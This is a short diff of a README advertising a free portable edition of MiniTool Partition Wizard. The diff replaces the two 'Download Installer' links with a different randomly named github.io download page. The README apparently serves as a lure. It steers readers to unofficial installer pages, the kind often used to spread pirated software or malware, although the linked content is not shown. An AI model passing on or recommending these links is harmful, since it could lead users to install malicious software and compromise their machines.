@@ -2,7 +2,7 @@
 
 Discover MiniTool Partition Wizard Portable 2026, a comprehensive disk management and partition recovery toolkit designed for Windows 10/11. This portable version provides full access to advanced partitioning, data protection, and disk optimization features without installation.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -50,7 +50,7 @@ A: MiniTool Partition Wizard uses advanced data protection technology. However, 
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
